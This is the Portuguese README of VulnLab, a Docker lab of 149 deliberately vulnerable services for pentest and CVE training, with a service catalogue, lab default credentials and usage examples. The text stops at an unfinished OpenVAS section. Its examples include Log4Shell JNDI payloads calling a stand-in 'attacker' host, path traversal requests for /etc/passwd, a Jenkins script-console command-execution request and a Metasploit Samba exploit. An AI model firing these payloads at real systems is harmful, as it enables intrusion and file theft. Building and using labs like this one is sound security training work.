# VulnLab - Laboratório de Aplicações Vulneráveis

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Docker](https://img.shields.io/badge/Docker-Compose-2496ED?logo=docker)](https://docs.docker.com/compose/)
[![Containers](https://img.shields.io/badge/Containers-149-red)](./docker-compose.yml)
[![Security](https://img.shields.io/badge/Security-Training-orange)](https://owasp.org/)

---

## Sumário

- [Visão Geral](#visão-geral)
- [Arquitetura](#arquitetura)
- [Requisitos do Sistema](#requisitos-do-sistema)
- [Instalação e Configuração](#instalação-e-configuração)
- [Guia de Uso](#guia-de-uso)
- [Catálogo de Serviços](#catálogo-de-serviços)
  - [Aplicações Web Vulneráveis (OWASP/CTF)](#1-aplicações-web-vulneráveis-owaspctf)
  - [CVEs Específicas](#2-cves-específicas)
  - [CMS e Plataformas Web](#3-cms-e-plataformas-web)
  - [Bancos de Dados](#4-bancos-de-dados)
  - [Servidores Web e Application Servers](#5-servidores-web-e-application-servers)
  - [DevOps e CI/CD](#6-devops-e-cicd)
  - [Mensageria e Streaming](#7-mensageria-e-streaming)
  - [Monitoramento e Logging](#8-monitoramento-e-logging)
  - [Serviços de Rede e Infraestrutura](#9-serviços-de-rede-e-infraestrutura)
  - [Linguagens e Runtimes](#10-linguagens-e-runtimes)
  - [Sistemas Operacionais Base](#11-sistemas-operacionais-base)
- [Casos de Uso](#casos-de-uso)
- [Integração com Ferramentas de Segurança](#integração-com-ferramentas-de-segurança)
- [Troubleshooting](#troubleshooting)
- [Contribuição](#contribuição)
- [Aviso Legal](#aviso-legal)
- [Licença](#licença)

---

## Visão Geral

**VulnLab** é um ambiente de laboratório containerizado com **149 serviços Docker** intencionalmente vulneráveis, projetado para profissionais de segurança da informação, pentesters, estudantes e pesquisadores.

### Objetivos do Projeto

| Objetivo | Descrição |
|----------|-----------|
| **Testes de Penetração** | Ambiente seguro para prática de técnicas ofensivas |
| **Treinamento em Segurança** | Capacitação de equipes Red Team e Blue Team |
| **Estudos de CVEs** | Reprodução e análise de vulnerabilidades conhecidas |
| **Validação de Scanners** | Testes com OpenVAS, Nessus, Qualys, Nuclei, etc. |
| **Prática de CTF** | Cenários realistas para competições |
| **Desenvolvimento de Exploits** | Pesquisa em ambiente controlado |
| **DevSecOps** | Integração de segurança em pipelines CI/CD |

### Características Principais

- **149 containers** distribuídos em 11 categorias
- **Rede isolada** (`172.30.0.0/15`) para segmentação
- **Binding em localhost** (`127.0.0.1`) para segurança
- **Gerenciamento unificado** via script `lab.sh`
- **Inicialização seletiva** para economia de recursos
- **Compatível com Docker Compose v1 e v2**

---

## Arquitetura

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                              HOST MACHINE                                   │
│  ┌───────────────────────────────────────────────────────────────────────┐  │
│  │                         Docker Engine                                 │  │
│  │  ┌─────────────────────────────────────────────────────────────────┐  │  │
│  │  │                    vulnnet (172.30.0.0/15)                       │  │  │
│  │  │                                                                  │  │  │
│  │  │   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │  │  │
│  │  │   │  Web     │  │ Database │  │ DevOps   │  │ Network  │       │  │  │
│  │  │   │  Apps    │  │ Services │  │ Tools    │  │ Services │       │  │  │
│  │  │   │ (18)     │  │ (16)     │  │ (9)      │  │ (31)     │       │  │  │
│  │  │   └──────────┘  └──────────┘  └──────────┘  └──────────┘       │  │  │
│  │  │                                                                  │  │  │
│  │  │   ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐       │  │  │
│  │  │   │   CMS    │  │ Web      │  │Messaging │  │Monitoring│       │  │  │
│  │  │   │ Platforms│  │ Servers  │  │ Queues   │  │ Logging  │       │  │  │
│  │  │   │ (14)     │  │ (17)     │  │ (8)      │  │ (12)     │       │  │  │
│  │  │   └──────────┘  └──────────┘  └──────────┘  └──────────┘       │  │  │
│  │  │                                                                  │  │  │
│  │  │   ┌──────────┐  ┌──────────┐  ┌──────────┐                      │  │  │
│  │  │   │  CVEs    │  │ Runtimes │  │   OS     │                      │  │  │
│  │  │   │ Specific │  │Languages │  │  Base    │                      │  │  │
│  │  │   │ (5)      │  │ (12)     │  │  (8)     │                      │  │  │
│  │  │   └──────────┘  └──────────┘  └──────────┘                      │  │  │
│  │  │                                                                  │  │  │
│  │  └─────────────────────────────────────────────────────────────────┘  │  │
│  └───────────────────────────────────────────────────────────────────────┘  │
│                                                                              │
│  Exposed on 127.0.0.1 only (localhost binding)                              │
└─────────────────────────────────────────────────────────────────────────────┘
```

### Configuração de Rede

| Parâmetro | Valor |
|-----------|-------|
| **Nome da Rede** | `vulnnet` |
| **Driver** | `bridge` |
| **Subnet** | `172.30.0.0/15` |
| **Range de IPs** | `172.30.0.1` - `172.31.255.254` |
| **Gateway** | `172.30.0.1` |
| **Binding Externo** | `127.0.0.1` (localhost only) |

---

## Requisitos do Sistema

### Mínimos

| Recurso | Especificação |
|---------|---------------|
| **CPU** | 4 cores |
| **RAM** | 8 GB |
| **Disco** | 50 GB livres |
| **Docker** | 20.10+ |
| **Docker Compose** | 1.29+ ou v2 |
| **SO** | Linux, macOS, Windows (WSL2) |

### Recomendados (para todos os containers)

| Recurso | Especificação |
|---------|---------------|
| **CPU** | 8+ cores |
| **RAM** | 32 GB |
| **Disco** | 150 GB SSD |
| **Docker** | 24.0+ |
| **Docker Compose** | v2.20+ |

### Verificação de Pré-requisitos

```bash
# Verificar versão do Docker
docker --version

# Verificar versão do Docker Compose
docker-compose --version  # v1
docker compose version    # v2

# Verificar recursos disponíveis
free -h          # Linux
sysctl hw.memsize # macOS
```

---

## Instalação e Configuração

### 1. Clone do Repositório

```bash
git clone https://github.com/CristhianKapelinski/LabVulnerabilities.git
cd LabVulnerabilities
```

### 2. Permissões do Script

```bash
chmod +x lab.sh
```

### 3. (Opcional) Pré-download das Imagens

```bash
# Baixar todas as imagens antecipadamente
./lab.sh pull
```

### 4. Configuração do Docker Compose v2 (se necessário)

```bash
# Criar alias para compatibilidade
alias docker-compose='docker compose'

# Ou adicionar ao ~/.bashrc ou ~/.zshrc
echo "alias docker-compose='docker compose'" >> ~/.bashrc
source ~/.bashrc
```

---

## Guia de Uso

### Comandos Disponíveis

| Comando | Descrição | Exemplo |
|---------|-----------|---------|
| `./lab.sh start` | Inicia todos os containers | `./lab.sh start` |
| `./lab.sh start <srv...>` | Inicia containers específicos | `./lab.sh start dvwa juice-shop` |
| `./lab.sh stop` | Para todos os containers | `./lab.sh stop` |
| `./lab.sh restart` | Reinicia todos os containers | `./lab.sh restart` |
| `./lab.sh status` | Mostra status dos containers | `./lab.sh status` |
| `./lab.sh logs <srv>` | Exibe logs de um container | `./lab.sh logs dvwa` |
| `./lab.sh ips` | Lista IPs de todos os containers | `./lab.sh ips` |
| `./lab.sh scan-targets` | Mostra alvos para scanners | `./lab.sh scan-targets` |
| `./lab.sh export-targets` | Exporta IPs para `targets.txt` | `./lab.sh export-targets` |
| `./lab.sh stats` | Mostra uso de recursos (CPU/RAM) | `./lab.sh stats` |
| `./lab.sh clean` | Remove containers e volumes | `./lab.sh clean` |
| `./lab.sh pull` | Baixa todas as imagens | `./lab.sh pull` |

### Exemplos de Uso

#### Smoke Test (Teste Rápido)

```bash
# Iniciar apenas aplicações web essenciais
./lab.sh start dvwa juice-shop webgoat

# Verificar se estão rodando
./lab.sh status

# Acessar:
# - DVWA: http://127.0.0.1:8005
# - Juice Shop: http://127.0.0.1:3000
# - WebGoat: http://127.0.0.1:8003/WebGoat
```

#### Laboratório de Banco de Dados

```bash
# Iniciar todos os bancos vulneráveis
./lab.sh start mysql-old mysql55 postgres-old mongodb-noauth redis-noauth

# Conectar ao MySQL
mysql -h 127.0.0.1 -P 33061 -u root -proot

# Conectar ao PostgreSQL
psql -h 127.0.0.1 -p 54321 -U postgres

# Conectar ao MongoDB (sem autenticação)
mongosh --host 127.0.0.1 --port 27017

# Conectar ao Redis (sem autenticação)
redis-cli -h 127.0.0.1 -p 6382
```

#### Laboratório de CVEs

```bash
# Iniciar containers com CVEs específicas
./lab.sh start log4shell sambacry ssh-cve-2016-6515 tomcat-ghostcat apache-cve-2021-41773

# Log4Shell (CVE-2021-44228)
curl http://127.0.0.1:8883 -H 'X-Api-Version: ${jndi:ldap://attacker.com/a}'

# Apache Path Traversal (CVE-2021-41773)
curl http://127.0.0.1:8882/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd
```

---

## Catálogo de Serviços

### 1. Aplicações Web Vulneráveis (OWASP/CTF)

Aplicações web intencionalmente vulneráveis para prática de pentest, CTF e treinamento OWASP Top 10.

| Serviço | Imagem | IP | Porta | Descrição |
|---------|--------|-----|-------|-----------|
| `metasploitable2` | `tleemcjr/metasploitable2` | `172.30.1.1` | - | VM completa com múltiplos serviços vulneráveis |
| `juice-shop` | `bkimminich/juice-shop` | `172.30.7.1` | `3000:3000` | OWASP Juice Shop - moderna aplicação vulnerável |
| `dvwa` | `vulnerables/web-dvwa` | `172.30.9.1` | `8005:80` | Damn Vulnerable Web Application |
| `webgoat` | `webgoat/webgoat` | `172.30.8.1` | `8003:8080` | OWASP WebGoat - tutoriais interativos |
| `webgoat-legacy` | `webgoat/webgoat` | `172.30.9.7` | `8011:8080` | Versão legacy do WebGoat |
| `hackazon` | `ianwijaya/hackazon` | `172.30.7.2` | `8001:80` | E-commerce vulnerável realista |
| `bwapp` | `raesene/bwapp` | `172.30.9.2` | `8006:80` | Buggy Web Application |
| `mutillidae` | `citizenstig/nowasp` | `172.30.9.3` | `8007:80` | OWASP Mutillidae II |
| `railsgoat` | `owasp/railsgoat` | `172.30.8.3` | `3001:3000` | Aplicação Rails vulnerável |
| `security-shepherd` | `ismisepaul/securityshepherd` | `172.30.8.4` | `8004:80` | OWASP Security Shepherd |
| `vampi` | `erev0s/vampi` | `172.30.10.2` | `5002:5000` | Vulnerable API (REST) |
| `damn-vulnerable-graphql` | `dolevf/dvga` | `172.30.10.4` | `5013:5013` | API GraphQL vulnerável |
| `wackopicko` | `adamdoupe/wackopicko` | `172.30.39.1` | `8040:80` | Aplicação PHP vulnerável |
| `dvna` | `appsecco/dvna` | `172.31.1.104` | `9094:9090` | Damn Vulnerable NodeJS Application |
| `ssrflab` | `youyouorz/ssrf-vulnerable-lab` | `172.31.1.106` | `8109:80` | Laboratório de SSRF |
| `sqli` | `acgpiano/sqli-labs` | `172.31.1.107` | `8110:80` | SQL Injection Labs |
| `httpbin` | `kennethreitz/httpbin` | `172.30.50.1` | `8048:80` | HTTP Request/Response testing |
| `echo-server` | `jmalloc/echo-server` | `172.30.50.3` | `8050:8080` | Echo server para testes |

**Credenciais Padrão:**

| Aplicação | Usuário | Senha |
|-----------|---------|-------|
| DVWA | `admin` | `password` |
| WebGoat | `guest` | `guest` |
| bWAPP | `bee` | `bug` |
| Juice Shop | Registrar novo usuário | - |

---

### 2. CVEs Específicas

Containers configurados para reproduzir vulnerabilidades CVE específicas documentadas.

| Serviço | Imagem | IP | Porta | CVE | Severidade |
|---------|--------|-----|-------|-----|------------|
| `log4shell` | `ghcr.io/christophetd/log4shell-vulnerable-app` | `172.30.6.4` | `8883:8080` | CVE-2021-44228 | **CRÍTICA (10.0)** |
| `sambacry` | `vulnerables/cve-2017-7494` | `172.30.4.1` | `4451:445, 1391:139` | CVE-2017-7494 | **CRÍTICA (9.8)** |
| `ssh-cve-2016-6515` | `vulnerables/cve-2016-6515` | `172.30.3.1` | `2222:22` | CVE-2016-6515 | **ALTA (7.5)** |
| `tomcat-ghostcat` | `vulhub/tomcat:9.0.30` | `172.30.44.2` | `8047:8080, 8009:8009` | CVE-2020-1938 | **CRÍTICA (9.8)** |
| `apache-cve-2021-41773` | `httpd:2.4.49` | `172.30.6.3` | `8882:80` | CVE-2021-41773 | **CRÍTICA (9.8)** |

**Detalhes das CVEs:**

| CVE | Nome | Tipo | Impacto |
|-----|------|------|---------|
| CVE-2021-44228 | Log4Shell | RCE via JNDI Injection | Execução remota de código |
| CVE-2017-7494 | SambaCry | RCE via Samba | Execução remota de código |
| CVE-2016-6515 | OpenSSH DoS | DoS via password length | Negação de serviço |
| CVE-2020-1938 | Ghostcat | File Read/Include | Leitura de arquivos sensíveis |
| CVE-2021-41773 | Apache Path Traversal | Path Traversal/RCE | Leitura de arquivos/RCE |

---

### 3. CMS e Plataformas Web

Sistemas de gerenciamento de conteúdo com versões vulneráveis conhecidas.

| Serviço | Imagem | IP | Porta | Vulnerabilidades Conhecidas |
|---------|--------|-----|-------|----------------------------|
| `wordpress-vuln` | `wordpress:4.6` | `172.30.11.1` | `8015:80` | PHPMailer RCE, REST API |
| `wp46` | `wordpress:4.6` | `172.31.1.82` | `8095:80` | CVE-2016-10033 |
| `wp49` | `wordpress:4.9` | `172.31.1.83` | `8096:80` | Múltiplas XSS, CSRF |
| `drupal7` | `drupal:7` | `172.31.1.84` | `8097:80` | Drupalgeddon (CVE-2014-3704) |
| `drupal85` | `drupal:8.5` | `172.31.1.85` | `8098:80` | Drupalgeddon 2 (CVE-2018-7600) |
| `joomla38` | `joomla:3.8` | `172.31.1.86` | `8099:80` | SQLi, Object Injection |
| `gitlab-vuln` | `gitlab/gitlab-ce:10.0.0-ce.0` | `172.30.12.2` | `8017:80` | Múltiplas RCE |
| `owncloud-old` | `owncloud:9.1` | `172.30.31.1` | `8031:80` | CSRF, SQLi |
| `owncloud9` | `owncloud:9` | `172.31.1.92` | `8105:80` | Code Execution |
| `nextcloud12` | `nextcloud:12` | `172.31.1.93` | `8106:80` | SSRF, SQLi |
| `mediawiki-old` | `mediawiki:1.27` | `172.30.32.1` | `8033:80` | XSS, RCE |
| `mediawiki128` | `mediawiki:1.28` | `172.31.1.94` | `8107:80` | Múltiplas vulnerabilidades |
| `redmine33` | `redmine:3.3` | `172.31.1.95` | `3006:3000` | XSS, CSRF |
| `dokuwiki` | `mprasil/dokuwiki` | `172.30.32.2` | `8034:80` | Auth Bypass, RCE |

---

### 4. Bancos de Dados

SGBDs com versões desatualizadas, configurações inseguras ou sem autenticação.

| Serviço | Imagem | IP | Porta | Vulnerabilidade |
|---------|--------|-----|-------|-----------------|
| `mysql-old` | `mysql:5.5` | `172.30.14.1` | `33061:3306` | Versão EOL, múltiplas CVEs |
| `mysql55` | `mysql:5.5` | `172.31.1.25` | `33062:3306` | CVE-2012-2122 (auth bypass) |
| `mysql56` | `mysql:5.6` | `172.31.1.26` | `33063:3306` | Privilege escalation |
| `mariadb10` | `mariadb:10.0` | `172.31.1.27` | `33064:3306` | Versão desatualizada |
| `postgres-old` | `postgres:9.4` | `172.30.14.2` | `54321:5432` | CVE-2019-9193 |
| `pg93` | `postgres:9.3` | `172.31.1.28` | `54322:5432` | Múltiplas CVEs |
| `pg95` | `postgres:9.5` | `172.31.1.29` | `54323:5432` | Privilege escalation |
| `mongodb-noauth` | `mongo:3.4` | `172.30.14.3` | `27017:27017` | **Sem autenticação** |
| `mongo32` | `mongo:3.2` | `172.31.1.30` | `27018:27017` | Versão EOL |
| `mongo36` | `mongo:3.6` | `172.31.1.31` | `27019:27017` | Versão desatualizada |
| `redis-noauth` | `redis:4.0` | `172.30.14.4` | `6382:6379` | **Sem autenticação** |
| `redis32` | `redis:3.2` | `172.31.1.32` | `6380:6379` | CVE-2015-8080 |
| `redis50` | `redis:5.0` | `172.31.1.33` | `6381:6379` | Lua sandbox escape |
| `cassandra22` | `cassandra:2.2` | `172.31.1.34` | `9043:9042` | Versão EOL |
| `couchdb-old` | `couchdb:1.6` | `172.30.14.6` | `5984:5984` | CVE-2017-12635/12636 |
| `couchdb16` | `couchdb:1.6` | `172.31.1.35` | `5985:5984` | Privilege escalation |

**Credenciais Padrão:**

| Banco | Usuário | Senha | Variável de Ambiente |
|-------|---------|-------|---------------------|
| MySQL | `root` | `root` | `MYSQL_ROOT_PASSWORD=root` |
| PostgreSQL | `postgres` | `postgres` | `POSTGRES_PASSWORD=postgres` |
| MongoDB | - | - | Sem autenticação |
| Redis | - | - | Sem autenticação |

---

### 5. Servidores Web e Application Servers

Servidores HTTP e de aplicação com vulnerabilidades conhecidas.

| Serviço | Imagem | IP | Porta | Vulnerabilidades |
|---------|--------|-----|-------|------------------|
| `apache-old` | `httpd:2.2` | `172.30.15.2` | `8021:80` | CVE-2017-3167, CVE-2017-3169 |
| `apache22` | `httpd:2.2` | `172.31.1.9` | `8150:80` | Múltiplas CVEs EOL |
| `apache246` | `httpd:2.4.6` | `172.31.1.10` | `8051:80` | CVE-2017-15710 |
| `nginx-old` | `nginx:1.10` | `172.30.15.1` | `8020:80` | Versão desatualizada |
| `nginx110` | `nginx:1.10` | `172.31.1.11` | `8152:80` | CVE-2017-7529 |
| `nginx112` | `nginx:1.12` | `172.31.1.12` | `8153:80` | Integer overflow |
| `nginx114` | `nginx:1.14` | `172.31.1.13` | `8154:80` | HTTP/2 vulnerabilities |
| `lighttpd` | `sebp/lighttpd` | `172.31.1.14` | `8055:80` | Versão desatualizada |
| `caddy20` | `caddy:2.0.0` | `172.31.1.15` | `8155:80` | Early version bugs |
| `tomcat6` | `tomcat:6` | `172.31.1.16` | `8060:8080` | **EOL** - múltiplas RCE |
| `tomcat7` | `tomcat:7.0.70` | `172.31.1.17` | `8061:8080` | CVE-2017-12617 (RCE) |
| `tomcat7-vuln` | `tomcat:7.0.94` | `172.30.44.1` | `8046:8080` | Manager app exposed |
| `tomcat8` | `tomcat:8.0` | `172.31.1.18` | `8062:8080` | Deserialization RCE |
| `jboss7` | `jboss/wildfly:8.2.1.Final` | `172.31.1.20` | `8064:8080` | JMX Console exposed |
| `wildfly9` | `jboss/wildfly:9.0.2.Final` | `172.31.1.21` | `8065:8080` | Deserialization |
| `wildfly10` | `jboss/wildfly:10.1.0.Final` | `172.31.1.22` | `8066:8080` | Admin console vulns |
| `glassfish41` | `oracle/glassfish:4.1` | `172.31.1.24` | `8067:8080, 4848:4848` | Admin auth bypass |

---

### 6. DevOps e CI/CD

Ferramentas de integração contínua e repositórios de código com vulnerabilidades.

| Serviço | Imagem | IP | Porta | Vulnerabilidades |
|---------|--------|-----|-------|------------------|
| `jenkins260` | `jenkins/jenkins:2.60` | `172.31.1.48` | `8080:8080` | Deserialization RCE, Script Console |
| `jenkins2150` | `jenkins/jenkins:2.150` | `172.31.1.49` | `8081:8080` | CVE-2019-1003000 |
| `gitlab10` | `gitlab/gitlab-ce:10.0.0-ce.0` | `172.31.1.55` | `8085:80` | Múltiplas RCE |
| `nexus2` | `sonatype/nexus:2.14.4` | `172.31.1.50` | `8082:8081` | EL Injection RCE |
| `sonar67` | `sonarqube:6.7` | `172.31.1.52` | `9001:9000` | Auth bypass |
| `sonar70` | `sonarqube:7.0` | `172.31.1.53` | `9002:9000` | API vulnerabilities |
| `artifactory5` | `jfrog/artifactory-oss:5.11.0` | `172.31.1.54` | `8084:8081` | Path traversal |
| `gogs011` | `gogs/gogs:0.11` | `172.31.1.56` | `3002:3000` | CVE-2018-18925 (RCE) |
| `gitea14` | `gitea/gitea:1.4.0` | `172.31.1.57` | `3010:3000` | SSRF, XSS |

**Credenciais Padrão:**

| Serviço | Usuário | Senha |
|---------|---------|-------|
| Jenkins | - | Inicial sem auth |
| Nexus | `admin` | `admin123` |
| SonarQube | `admin` | `admin` |
| GitLab | `root` | Configurar no primeiro acesso |

---

### 7. Mensageria e Streaming

Message brokers e sistemas de streaming de dados.

| Serviço | Imagem | IP | Porta | Vulnerabilidades |
|---------|--------|-----|-------|------------------|
| `rabbitmq-old` | `rabbitmq:3.6-management` | `172.30.20.1` | `5672:5672, 15672:15672` | Default creds |
| `rabbit36` | `rabbitmq:3.6-management` | `172.31.1.58` | `5673:5672, 15673:15672` | CVE-2017-4966 |
| `rabbit37` | `rabbitmq:3.7-management` | `172.31.1.59` | `5674:5672, 15674:15672` | MQTT vulnerabilities |
| `kafka-old` | `wurstmeister/kafka:2.11-0.10.2.2` | `172.30.47.1` | `9092:9092` | Sem autenticação |
| `kafka011` | `wurstmeister/kafka:2.11-0.11.0.3` | `172.31.1.60` | `9093:9092` | CVE-2018-1288 |
| `activemq-old` | `rmohr/activemq:5.14.3` | `172.30.20.2` | `61616:61616, 8161:8161` | Deserialization RCE |
| `activemq514` | `rmohr/activemq:5.14.3` | `172.31.1.61` | `61617:61616, 8162:8161` | CVE-2016-3088 |
| `zookeeper-old` | `zookeeper:3.4` | `172.30.46.1` | `2181:2181` | Sem autenticação |

**Credenciais Padrão:**

| Serviço | Usuário | Senha | Console |
|---------|---------|-------|---------|
| RabbitMQ | `guest` | `guest` | `:15672` |
| ActiveMQ | `admin` | `admin` | `:8161` |

---

### 8. Monitoramento e Logging

Sistemas de observabilidade, métricas e logs.

| Serviço | Imagem | IP | Porta | Vulnerabilidades |
|---------|--------|-----|-------|------------------|
| `elasticsearch-old` | `elasticsearch:2.4.6` | `172.30.14.5` | `9200:9200, 9300:9300` | CVE-2015-1427 (RCE) |
| `es24` | `elasticsearch:2.4` | `172.31.1.64` | `9201:9200` | Groovy scripting RCE |
| `es56` | `elasticsearch:5.6` | `172.31.1.65` | `9202:9200` | Directory traversal |
| `kibana-old` | `kibana:4.6` | `172.30.19.1` | `5601:5601` | Prototype pollution |
| `kibana46` | `kibana:4.6` | `172.31.1.67` | `5602:5601` | CVE-2017-11479 |
| `kibana56` | `kibana:5.6` | `172.31.1.68` | `5603:5601` | LFI vulnerability |
| `logstash56` | `logstash:5.6` | `172.31.1.69` | `5045:5044` | Deserialization |
| `grafana-old` | `grafana/grafana:5.1.0` | `172.30.19.2` | `3003:3000` | CVE-2018-15727 (Auth bypass) |
| `prometheus-old` | `prom/prometheus:v2.15.2` | `172.31.1.72` | `9091:9090` | SSRF via config reload |
| `influx13` | `influxdb:1.3` | `172.31.1.73` | `8087:8086` | Auth bypass |
| `nagios` | `jasonrivers/nagios` | `172.31.1.74` | `8088:80` | Command injection |
| `zabbix40` | `zabbix/zabbix-server-mysql` | `172.31.1.75` | `10052:10051` | SQLi, RCE |

**Credenciais Padrão:**

| Serviço | Usuário | Senha |
|---------|---------|-------|
| Grafana | `admin` | `admin` |
| Nagios | `nagiosadmin` | `nagios` |
| Kibana | - | Sem auth |

---

### 9. Serviços de Rede e Infraestrutura

Protocolos de rede, proxy, DNS, LDAP, cache e outros serviços de infraestrutura.

| Serviço | Imagem | IP | Porta | Vulnerabilidades |
|---------|--------|-----|-------|------------------|
| `proftpd-vuln` | `infosecwarrior/ftp:v1` | `172.30.2.2` | `2122:21` | Backdoor, mod_copy |
| `ubuntu-sshd-old` | `rastasheep/ubuntu-sshd:14.04` | `172.30.3.2` | `2223:22` | Weak config |
| `openssh` | `linuxserver/openssh-server` | `172.31.1.96` | `2224:22` | Config testing |
| `vsftpd` | `fauria/vsftpd` | `172.31.1.97` | `2123:21` | Anonymous upload |
| `dns-vuln` | `infosecwarrior/dns-lab:v2` | `172.30.5.1` | `5353:53/udp, 8053:80` | Zone transfer |
| `bind` | `sameersbn/bind:9.11.3` | `172.31.1.101` | `5354:53/udp` | Versão desatualizada |
| `openldap` | `osixia/openldap:1.2.0` | `172.30.29.1` | `3891:389, 6361:636` | Anonymous bind |
| `phpldapadmin` | `osixia/phpldapadmin:0.7.1` | `172.30.29.2` | `8030:80` | XSS, Injection |
| `mailcatcher` | `schickling/mailcatcher` | `172.30.17.1` | `1025:1025, 1080:1080` | Open relay testing |
| `dovecot` | `dovecot/dovecot` | `172.31.1.100` | `1431:143` | Config testing |
| `squid-old` | `sameersbn/squid:3.3.8-23` | `172.30.18.1` | `3128:3128` | CVE-2014-0128 |
| `squid35` | `sameersbn/squid:3.5.27-2` | `172.31.1.79` | `3129:3128` | Cache poisoning |
| `haproxy15` | `haproxy:1.5` | `172.31.1.76` | `8090:80` | HTTP desync |
| `haproxy16` | `haproxy:1.6` | `172.31.1.77` | `8091:80` | Buffer overflow |
| `haproxy17` | `haproxy:1.7` | `172.31.1.78` | `8092:80` | CVE-2018-14645 |
| `traefik15` | `traefik:1.5` | `172.31.1.80` | `8093:80` | API exposure |
| `docker-registry-noauth` | `registry:2` | `172.30.21.1` | `5000:5000` | **Sem autenticação** |
| `memcached-old` | `memcached:1.4` | `172.30.25.1` | `11211:11211` | DDoS amplification |
| `memcached14` | `memcached:1.4` | `172.31.1.102` | `11212:11211` | CVE-2016-8704 |
| `memcached15` | `memcached:1.5` | `172.31.1.103` | `11213:11211` | Auth bypass |
| `snmpd` | `polinux/snmpd` | `172.30.30.1` | `1611:161/udp` | Default community strings |
| `asterisk` | `andrius/asterisk` | `172.30.28.1` | `5060:5060/udp` | SIP vulnerabilities |
| `consul-old` | `consul:0.9.0` | `172.30.48.1` | `8500:8500, 8600:8600/udp` | RCE via services |
| `vault-old` | `vault:0.9.0` | `172.30.49.1` | `8200:8200` | Auth bypass |
| `solr-old` | `solr:6.6` | `172.30.45.1` | `8983:8983` | CVE-2017-12629 (RCE) |
| `phpmyadmin-old` | `phpmyadmin:4.6` | `172.30.26.1` | `8026:80` | LFI, XSS |
| `pma46` | `phpmyadmin:4.6` | `172.31.1.88` | `8101:80` | CVE-2016-5703 |
| `pma48` | `phpmyadmin:4.8` | `172.31.1.89` | `8102:80` | CVE-2018-12613 (LFI) |
| `adminer` | `adminer:4.2` | `172.30.26.2` | `8027:8080` | SSRF |
| `adminer42` | `adminer:4.2` | `172.31.1.90` | `8103:8080` | Login bypass |

---

### 10. Linguagens e Runtimes

Ambientes de execução com versões desatualizadas para testes de dependências vulneráveis.

| Serviço | Imagem | IP | Porta | EOL/Vulnerabilidades |
|---------|--------|-----|-------|----------------------|
| `python27` | `python:2.7` | `172.31.1.36` | - | **EOL** - Jan 2020 |
| `python35` | `python:3.5` | `172.31.1.37` | - | **EOL** - Sep 2020 |
| `python36` | `python:3.6` | `172.31.1.38` | - | **EOL** - Dec 2021 |
| `node6` | `node:6` | `172.31.1.39` | - | **EOL** - Apr 2019 |
| `node8` | `node:8` | `172.31.1.40` | - | **EOL** - Dec 2019 |
| `node10` | `node:10` | `172.31.1.41` | - | **EOL** - Apr 2021 |
| `ruby23` | `ruby:2.3` | `172.31.1.42` | - | **EOL** - Mar 2019 |
| `ruby24` | `ruby:2.4` | `172.31.1.43` | - | **EOL** - Apr 2020 |
| `php56` | `php:5.6-apache` | `172.31.1.44` | `8070:80` | **EOL** - Dec 2018 |
| `php70` | `php:7.0-apache` | `172.31.1.45` | `8071:80` | **EOL** - Jan 2019 |
| `go19` | `golang:1.9` | `172.31.1.46` | - | Versão desatualizada |
| `express-old` | `node:6.14` | `172.30.22.2` | `3004:3000` | Múltiplas CVEs |

---

### 11. Sistemas Operacionais Base

Imagens de SO desatualizadas para testes de vulnerabilidades de kernel e sistema.

| Serviço | Imagem | IP | Porta | EOL |
|---------|--------|-----|-------|-----|
| `ubuntu14` | `ubuntu:14.04` | `172.31.1.1` | - | **Abr 2019** |
| `ubuntu16` | `ubuntu:16.04` | `172.31.1.2` | - | **Abr 2021** |
| `debian8` | `debian:jessie` | `172.31.1.3` | - | **Jun 2020** |
| `debian9` | `debian:stretch` | `172.31.1.4` | - | **Jun 2022** |
| `centos6` | `centos:6` | `172.31.1.5` | - | **Nov 2020** |
| `centos7` | `centos:7` | `172.31.1.6` | - | **Jun 2024** |
| `alpine37` | `alpine:3.7` | `172.31.1.7` | - | **Nov 2019** |
| `fedora28` | `fedora:28` | `172.31.1.8` | - | **Mai 2019** |

---

## Casos de Uso

### 1. Treinamento OWASP Top 10

```bash
# Iniciar ambiente completo OWASP
./lab.sh start dvwa juice-shop webgoat bwapp mutillidae

# Praticar:
# A01 - Broken Access Control: Juice Shop
# A02 - Cryptographic Failures: DVWA
# A03 - Injection: SQLi Labs, DVWA
# A07 - XSS: bWAPP, Mutillidae
```

### 2. Pentest de Infraestrutura

```bash
# Ambiente de rede completo
./lab.sh start metasploitable2 proftpd-vuln ssh-cve-2016-6515 sambacry \
              mysql-old postgres-old mongodb-noauth redis-noauth

# Executar Nmap
nmap -sV -sC 172.30.0.0/16

# Usar Metasploit
msfconsole
use exploit/multi/samba/usermap_script
```

### 3. Análise de CVEs

```bash
# Laboratório de CVEs críticas
./lab.sh start log4shell apache-cve-2021-41773 tomcat-ghostcat sambacry

# Reproduzir Log4Shell
curl -H 'X-Api-Version: ${jndi:ldap://attacker/a}' http://127.0.0.1:8883

# Reproduzir Apache Path Traversal
curl 'http://127.0.0.1:8882/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'
```

### 4. DevSecOps Pipeline Testing

```bash
# Ferramentas CI/CD vulneráveis
./lab.sh start jenkins260 gitlab10 nexus2 sonar67 docker-registry-noauth

# Testar Jenkins Script Console
curl -X POST 'http://127.0.0.1:8080/scriptText' \
     --data-urlencode 'script=println "id".execute().text'
```

---

## Integração com Ferramentas de Segurança

### OpenVAS (Greenbone Vulnerability Management)

O OpenVAS é um scanner de vulnerabilidades open-source. Este guia mostra como escanear os containers do VulnLab.

#### Passo 1: Exportar Alvos do VulnLab

```bash
# Exportar IPs para arquivo
./lab.sh export-targets

# Verificar arquivo gerado
cat targets.txt
# Output: 172.30.1.1,172.30.2.2,172.30.3.1,...

# Alternativa: listar IPs diretamente
./lab.sh ips

# Exportar apenas IPs específicos (web apps)
./lab.sh ips | grep -E "dvwa|juice-shop|webgoat" | awk '{print $2}' > web-targets.txt
```

#### Passo 2: Criar Target no OpenVAS (via Web UI)

1. Acesse o Greenbone Security Assistant (GSA): `https://localhost:9392`
2. Navegue para **Configuration → Targets → New Target**
3. Configure:
   - **Name:** `VulnLab-Full` ou `VulnLab-WebApps`
   - **Hosts:** Cole o conteúdo do `targets.txt` ou use `172.30.0.0/15`
   - **Port List:** `All TCP and Nmap top 100 UDP`

#### Passo 3: Criar Target via CLI (gvm-cli)

